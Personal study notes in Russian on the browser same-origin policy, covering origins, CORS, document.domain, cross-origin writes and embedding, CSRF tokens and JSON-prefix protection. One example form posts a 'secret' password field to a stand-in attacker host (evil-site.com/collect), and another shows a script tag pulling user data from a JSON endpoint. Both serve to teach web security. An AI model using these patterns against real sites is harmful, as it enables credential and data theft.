Вообщем на странице не всегда находятся данные только от домена, куда мы отправляем GET запрос изначально. Например:
```c
<img src="https://route">
``` 
В таком случае сайт автоматически сделает GET запросе к странице с картинкой. Там может быть что-то не очень хорошее.

#### Определение origin(источника)
У 2 URL одинаковый источник, если протокол, порт, хост одинаковы. Под хостом подразумевается доменное имя или IP адрес видимо.

*Наследуемые источники*
Скрипты, которые выполняются через about:blank или javascript:URL (устарел) наследуют источник документа, содержащего URL.
Про about:blank - это специальная страница, использующаяся в качестве заглушки.  Фактически: `about:blank` — это **переход внутри браузера на встроенную страницу**, без сетевого взаимодействия.
Можно использовать через *Window.open()* . Этот метод загружает специальный ресурс в новый или существующий браузерный контекст. Пример
```c
window.open("https://www.mozilla.org/", "mozillaTab");
```
Это просто откроют новую вкладку с нужным адресом
Если сделаем так с about:blank то источник будет полностью наследоваться
Можно сделать также с data: тогда контекст окна будет полностью отдельным.
*Источники файлов*
Используется термин *opaque origins - непрозрачные источники*. Вообщем, смысл в том, что один файл на компе, например html файл, не может получить доступ к  другому файлу на устройстве - им выдаются разные источники. Это вызывает *CORS* ошибку.
*CORS* - специальный механизм в браузере, который блокирует все запросы между разными источниками. А вообще CORS это часть HTTP. Однако с помощью специальных HTTP заголовков можно указывать какие источники имеют доступ к ресурсам сервера. Например: *Access-Control-Allow-Origin*.
PS: Я тут напутал немного. Вообщем смысл в том, что допустим у браузера есть скрипт, который делает fetch на другой сайт. Чтобы получить доступ к этому ресурсу браузер может потребовать, чтобы сервер сайта вернул ACAO заголовок. Иначе в браузер ничего не вернется - при это это защита только для браузера. #### Изменение источника 
Раньше можно было с помощью команды:
```c
document.domain = "superdomain"
```

установить источник в супердомен текущего домена. Однако номер порта проверяется отдельно. Нельзя сделать *document.domain = company.com* у *company.com:8080* это не позволит обратиться к company.com *company.com*. Так происходит, потому что *document.domain* автоматически скидывает для браузера номер порта в null. Важно, что меняется только условие проверки в браузере, но не TCB.
А вообще *Deepseek* пишет, что в последних версиях *document.domain* просто игнорируется.

#### Доступ между источниками по сети
Есть 3 типа взаимодействия:
1. Записи между источниками.  Обычно **разрешены**. Примеры - ссылки, редиректы, отправки форм.  Есть еще **preflight requests** но про них в другой раз мб. Например форма ниже:
```c
<!-- Страница на https://my-site.com -->
<form action="https://evil-site.com/collect" method="POST">
  <input name
  ="secret" value="password123">
  <button>Отправить</button>
</form>
```
2.  Встраивание **разрешено**. 
3. Чтение **запрещено**, но чтение часто достигается через утечки в встраивании

 Встроено может быть:
 ```
<script src=".."></script> - ошибки доступны только тому же источнику
<link rel="stylesheet" href="..."> - если ошибки, то не встроится
<img>, <video>, <audio>, <object>, <embed>, @font-face, <iframe>(настраивается с помощью X-Frame-Options)
 ```
**Доступ** 
Для разных источников определяется HTTP заголовками, которые относятся к CORS.

**Блокировка**
1. В каждом запросе должен быть CSRF токен.
2. В ресурс ничего не должно встраиваться.
3. Чтобы избежать внезапных встраиваний, вроде такого
```c
<script src="https://ваш-сайт.com/api/user-data"></script>
```
Мой сайт может отдавать данные с помощью application/json, злоумышленник может взять URL этого эндпоинта и вставить в script. Браузер будет парсить json как javascript, что не очень хорошо. Вообще надо сделать так, чтобы невозможно было распарсить.
```c
HTTP/1.1 200 OK
Content-Type: application/json
)]}',
{"user": "admin", "session": "secret"}
```

#### Доступ из 1 источника к другому
Есть специальные API - iframe.contentWindow, window.parent, window.open, window.opener. Они позволяют документам напрямую ссылаться друг на друга.
Если источники окон  совпадают - 1 протокол, домен, порт, то мы имеем право использовать полный функционал этого окна.
Если нет, то браузер предоставляет очень маленький функционал. Писать его тут не имею смысла, можно посмотреть вот здесь -  [Same-origin policy - Security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy#window)
Доступ в хранилищам - *Web Storage*, *IndexedDB* и *cookie* определен для каждого источника также раздельно.
